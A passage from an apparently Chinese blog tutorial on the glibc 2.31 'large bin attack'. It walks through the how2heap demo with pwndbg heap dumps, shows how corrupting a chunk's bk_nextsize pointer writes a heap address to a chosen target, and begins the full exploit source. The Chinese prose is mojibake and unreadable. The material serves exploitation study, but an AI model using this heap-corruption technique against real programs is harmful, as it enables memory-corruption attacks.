victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŠ äº†ä¸¤ä¸ªæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä»¥åŠ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯¼è‡´ä¼ ç»Ÿçš„ large bin attack æ²¡æ³•ä½¿ç”¨</p><p>ä½†æ˜¯å­˜åœ¨ä¸€ä¸ªæ–°çš„åˆ©ç”¨è·¯å¾„: </p><p>é¦–å…ˆå¸ƒç½®å¦‚ä¸‹çš„ heap </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x430</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596c0</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555596e0</span>      <span class="number">0x0</span>                 <span class="number">0x420</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b00</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>0x20 çš„ä¸º  guard chunk ï¼Œé¿å… free ä¹‹å chunk åˆå¹¶ , ç„¶åæˆ‘ä»¬free p1ï¼Œæ­¤æ—¶ chunk p1 ä¼šæ”¾å…¥ unsortedbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">54</span>   <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line">   <span class="number">55</span></span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line"> â–º <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">   <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">64</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe280</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe288</span> â€”â–¸ <span class="number">0x5555555592a0</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â€”â–¸ <span class="number">0x555555559b20</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe290</span> â€”â–¸ <span class="number">0x5555555596d0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe298</span> â€”â–¸ <span class="number">0x5555555596f0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe2a0</span> â€”â–¸ <span class="number">0x555555559b10</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fffffffe2a8</span> â€”â–¸ <span class="number">0x555555555140</span> (_start) â—‚â€” endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe2b0</span> â€”â–¸ <span class="number">0x7fffffffe3b0</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe2b8</span> â—‚â€” <span class="number">0xf7624ffb64d1fe00</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">5555555553f</span>a main+<span class="number">465</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559290</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559290</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å†  malloc ä¸€ä¸ªæ¯” p1 å¤§çš„ chunkï¼Œæ­¤æ—¶ p1 ä¼šè¢«æ”¾å…¥åˆ° lagrebin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> â–º <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> â€”â–¸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) â—‚â€” <span class="number">0x555555559290</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨ free p2  ( p2 å¤§å°å°äº p1 hå’Œ p3) , æ­¤æ—¶ p2 å°±ä¼šè¢«æ”¾å…¥åˆ° unsortedbin é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">65</span>   <span class="built_in">free</span>(p2);</span><br><span class="line"> â–º <span class="number">66</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">   <span class="number">67</span>   <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">68</span>   <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555596e0</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x5555555596e0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> â€”â–¸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) â—‚â€” <span class="number">0x555555559290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹ p1 çš„ bk_nextsize æŒ‡å‘ target-0x20 , æ­¤æ—¶çš„ p1 åœ¨ largebin é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> â–º <span class="number">72</span>   p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">   <span class="number">73</span>   <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span> &lt;------ bk-&gt;nextsize</span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;target</span><br><span class="line">$<span class="number">14</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffe280</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx &amp;target<span class="number">-2</span></span><br><span class="line"><span class="number">0x7fffffffe260</span>:<span class="number">0x00007fffffffe2c0</span><span class="number">0x0000555555555140</span></span><br><span class="line"><span class="number">0x7fffffffe270</span>:<span class="number">0x00007fffffffe3b0</span><span class="number">0x00005555555554a4</span></span><br><span class="line"><span class="number">0x7fffffffe280</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555555592a0</span></span><br><span class="line"><span class="number">0x7fffffffe290</span>:<span class="number">0x00005555555596d0</span><span class="number">0x00005555555596f0</span></span><br><span class="line"><span class="number">0x7fffffffe2a0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559b30</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å† malloc ä¸€ä¸ªæ¯” p2 å¤§ chunk ï¼ˆæ­¤æ—¶ p2 åœ¨ unsortedbin é‡Œï¼‰ï¼Œé‚£ä¹ˆæ­¤æ—¶ï¼Œå°±ä¼šå°† p2 ä» unsortedbin å–å‡ºï¼Œinsert  largebins é‡Œï¼Œé‚£ä¹ˆå°±å­˜åœ¨å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code>   â€”- &gt; <code> p1-&gt;fd_nextsize = p2-&gt;fd</code></p><p><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</code>   â€”â€”&gt; <code>p1-&gt;bk_nextsize = p2-&gt;fd-&gt;bk_next_size</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x5555555596e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x5555555596f0</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559700</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559720</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x7ffff7fb0be0</span> &lt;main_arena+<span class="number">96</span>&gt;:<span class="number">0x0000555555559f60</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fb0bf0</span> &lt;main_arena+<span class="number">112</span>&gt;:<span class="number">0x00005555555596e0</span><span class="number">0x00005555555596e0</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æˆåŠŸåœ¨ target ç›®æ ‡å†™å…¥ p2-&gt;fd-&gt;bk_next_size çš„å€¼ï¼Œå³ 0x00005555555596e0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x5555555596e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>é€šå¸¸è€Œè¨€ï¼Œè¿™ç§å†™å¤§æ•°çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥ä¿®æ”¹ <em>global_max_fast</em></p><p>å®Œæ•´ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = 